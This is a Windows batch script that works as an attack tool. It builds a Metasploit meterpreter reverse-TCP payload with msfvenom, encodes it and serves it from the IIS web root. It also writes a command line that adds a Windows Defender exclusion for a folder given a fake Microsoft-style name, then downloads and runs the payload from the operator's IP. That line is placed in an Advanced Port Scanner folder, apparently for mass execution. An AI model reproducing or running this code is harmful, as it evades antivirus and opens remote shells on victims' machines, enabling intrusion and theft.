@echo off
if not "%1"=="am_admin" (powershell start -verb runas "%0" am_admin & exit /b)
:looop
cls
ipconfig
echo.
set /p ip=Your ip:
if "%ip%"=="" goto looop
cls
set rand_app_name=regid_%random%%random%
echo md "%%programdata%%\regid.1574-03.com.microsoft" ^& powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%%programdata%%\regid.1574-03.com.microsoft" ^& %%systemdrive%% ^& cd "%%programdata%%\regid.1574-03.com.microsoft" ^& powershell -command "Invoke-WebRequest -URI 'http://%ip%/service.exe' -OutFile '%%programdata%%\regid.1574-03.com.microsoft\%rand_app_name%.exe'" ^& %rand_app_name%.exe > "%systemdrive%\Program Files (x86)\Advanced Port Scanner\commands.txt"
if exist "%systemdrive%\inetpub\wwwroot\Service.exe" del /q "%systemdrive%\inetpub\wwwroot\Service.exe"
start /min /wait %systemroot%\system32\cmd.exe /C %systemdrive%\metasploit-framework\bin\msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=%ip% LPORT=7899 --platform windows -f exe -e cmd/powershell_base64 -i 5 -o "%systemdrive%\inetpub\wwwroot\Service.exe"
if not exist "%systemdrive%\inetpub\wwwroot\Service.exe" echo UNABLE TO CREATE PAYLOAD & pause & exit
echo Done!
pause
goto looop